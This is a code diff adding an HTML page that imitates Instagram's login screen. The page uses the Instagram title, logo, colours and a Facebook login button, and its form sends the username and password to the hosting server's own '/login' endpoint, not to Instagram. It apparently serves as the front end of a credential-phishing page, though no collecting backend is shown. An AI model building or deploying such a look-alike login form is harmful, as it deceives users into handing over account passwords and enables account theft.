@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #fdfdfd, #e0e0e0);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .login-container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            padding: 40px;
+            width: 360px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-control {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 14px;
+        }
+        .login-button {
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            width: 100%;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .login-button:hover {
+            background-color: #3183c6;
+        }
+        .or-separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .or-separator hr {
+            flex: 1;
+            border: none;
+            border-top: 1px solid #dbdbdb;
+        }
+        .or-separator span {
+            margin: 0 10px;
+            font-size: 14px;
+            color: #8e8e8e;
+            font-weight: 600;
+        }
+        .facebook-login {
+            background-color: #4267b2;
+            color: white;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+        .facebook-login:hover {
+            background-color: #365899;
+        }
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .signup-link a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo">
+        <form action="/login" method="POST">
+            <div class="form-group">
+                <input type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+        <div class="or-separator">
+            <hr>
+            <span>Or</span>
+            <hr>
+        </div>
+        <a href="#" class="facebook-login">Log In with Facebook</a>
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up now</a>
+        </div>
+    </div>
+</body>
+</html>
